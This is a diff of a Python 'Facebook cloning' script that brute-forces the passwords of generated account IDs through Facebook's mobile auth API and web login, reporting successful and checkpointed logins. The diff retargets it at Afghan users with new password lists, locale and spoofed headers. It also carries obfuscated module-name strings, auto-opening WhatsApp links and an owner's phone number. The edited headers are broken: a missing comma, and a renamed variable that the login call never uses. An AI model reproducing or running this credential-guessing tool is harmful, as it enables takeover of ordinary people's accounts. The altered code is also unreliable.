@@ -7,7 +7,7 @@ gghb=g1+g2+g3+g4+g5+pr+pr1+pr2
 cx=('.g');cxx=('fig');xl=('/')
   
 import os,base64
-os.system("xdg-open https://m.me/KINGXMRSW4TI/?ref=share")
+os.system("xdg-open https://chat.whatsapp.com/IBITafA7ugtBTkRH760hj2/?ref=share")
 u1=('u');u2=('n');u3=('i');u4=('n');u5=('s');u6=('t');u7=('a');u8=('l');u9=('l')
 ustl=u1+u2+u3+u4+u5+u6+u7+u8+u9
 r1=('r');r2=('e');r3=('q');r4=('u');r5=('e');r6=('s');r7=('t');r8=('s')
@@ -116,7 +116,7 @@ logo=("""\033[1;32m
 \033[1;93m--------------------------------------------------
   \033[1;32mF4C3B00K  : Raziqullah Saadat
   \033[1;32mY0UTUB3   : @Saadat
-  \033[1;32mV3RS10N   : 0.1
+  \033[1;32mV3RS10N   : 1.0
   \033[1;32m0WN3R     : Raziqullah Saadat
 --------------------------------------------------
 \033[1;37m[-]Dear Paid user:
@@ -529,7 +529,7 @@ def menu():
 		public()
 	elif xd in ['4','04']:
 		clear()
-		print(' [1] Afghanistan cloning\n [2] Bangladesh cloning\n [3] gmail cloning\n [0] Back menu')
+		print(' [1] Afghanistan cloning\n [2] AFG Random cloning\n [3] gmail cloning\n [0] Back menu')
 		linex()
 		x=input(' Choose: ')
 		if x in ['1','01']:
@@ -550,7 +550,7 @@ def menu():
 	elif xd in ['8','08']:
 		os.system('rm -rf fb_cookies.txt')
 	elif xd in ['9','09']:
-		os.system(f'xdg-open https://www.facebook.com/profile.php?id=100028315179402');menu()
+		os.system(f'xdg-open https://chat.whatsapp.com/IBITafA7ugtBTkRH760hj2');menu()
 			
 	elif xd in ['0','00']:
 		exit(' KHUDA HAFIZ ')
@@ -567,7 +567,7 @@ def pak():
 		except ValueError:
 			limit = 5000
 		linex()
-		print(' [1] Method 1\n [2] Method 2 Best ')
+		print(' [1] Method 1Not Working\n [2] Method 2 Best ')
 		linex()
 		mthd = input(' Choose: ')
 		linex()
@@ -589,9 +589,9 @@ def pak():
 				if pcs in ['1','01']:
 					passlist = [psx,ids]
 				elif pcs in ['2','02']:
-					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234']
+					passlist = [psx,ids,'afghan123','khan123','kabul123','۱۲۳۴۵۶']
 				else:
-					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234','Ali123','ali786','khan123','khan12345']
+					passlist = [psx,ids,'afghan123','khan123','786786','kabul1234','kabul123','۱۲۳۴۵۶','afghanistan','khost12']
 				if mthd in ['1','01']:
 					AXI.submit(rcrack1,ids,passlist)
 				else:
@@ -613,7 +613,7 @@ def bd():
 		except ValueError:
 			limit = 5000
 		linex()
-		print(' [1] Method 1\n [2] Method 2 ')
+		print(' [1] Method 1Not Working\n [2] Method 2 ')
 		linex()
 		mthd = input(' Choose: ')
 		for nmbr in range(limit):
@@ -643,11 +643,11 @@ def bd():
 def gmail():
 		os.system('rm -rf .re.txt')
 		clear()
-		print('\033[1;32m example: muhammad, ali, sajjad, faizan , Awais\033[1;97m')
+		print('\033[1;32m example: afghan123','khan123','kabul123','۱۲۳۴۵۶\033[1;97m')
 		linex()
 		first = input(' Put first name: ')
 		linex()
-		print('\033[1;32m example: khan, ahmad, ali \033[1;97m')
+		print('\033[1;32m example: afghan123','khan123','kabul123','۱۲۳۴۵۶ \033[1;97m')
 		linex()
 		last = input(' Put last name: ')
 		linex()
@@ -660,11 +660,11 @@ def gmail():
 		except ValueError:
 			limit = 5000
 		linex()
-		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
+		print(' [1] Mix password  [2] name + digit password [3] Capital name password [4] Auto all password')
 		linex()
 		pxc = input(' Choose : ')
 		linex()
-		print(' [1] Method 1\n [2] Method 2 ')
+		print(' [1] Method 1Not Working\n [2] Method 2 ')
 		linex()
 		mthd = input(' Choose: ')
 		linex()
@@ -796,8 +796,8 @@ def rcrack1(ids,passlist):
 			'advertiser_id':adid,
 			'encrypted_msisdn':'',
 			'currently_logged_in_userid':'0',
-			'locale':'en_PK',
-			'client_country_code':'PK',
+			'locale':'en_AF',
+			'client_country_code':'AF',
 			'method':'auth.login',
 			'fb_api_req_friendly_name':'authenticate',
 			'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
@@ -854,20 +854,21 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'web.facebook.com',
-			'method': 'POST',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"macOS"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'none',
-			'sec-fetch-user': '?1',
-			'upgrade-insecure-requests': '1',
-			'user-agent': pro}
+			headers = {'authority': 'm.alpha.facebook.com',
+           'method': 'POST',
+           'scheme': 'https',
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+           'accept-language': 'en-US,en;q=0.9',
+           'cache-control': 'max-age=0'
+           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+           'sec-ch-ua-mobile': '?1',
+           'sec-ch-ua-platform': '"Android"',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'none',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
+           'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
 			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
@@ -876,7 +877,7 @@ def rcrack(ids,passlist):
 				if uid in oks:pass
 				else:
 					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [AFAQ-TL] '+ids+' | '+pas)
+						print('\r\r\033[1;34m [Saadat-OK] '+ids+' | '+pas)
 					else:
 						print(f'\r\x1b[1;32m [Saadat-OK] '+ids+' | '+pas)
 						cek_apk(session,coki)
@@ -921,7 +922,7 @@ def menu_apikey():
 \033[1;37m[-] GITHUB    :\033[1;32m Raziq
 \033[1;37m[-] WhatsApp  :\033[1;32m +93702856593
 \033[1;37m[-] TOOLS     :\033[1;32m MIX CLONING
-\033[1;37m[-] VERSION   :\033[1;32m 0.2
+\033[1;37m[-] VERSION   :\033[1;32m 1.0
 \033[1;37m[-] STATUS    :\033[1;32m FREE
 ==================================================
 \033[1;33m[*]TOOLS  : Facebook cloning
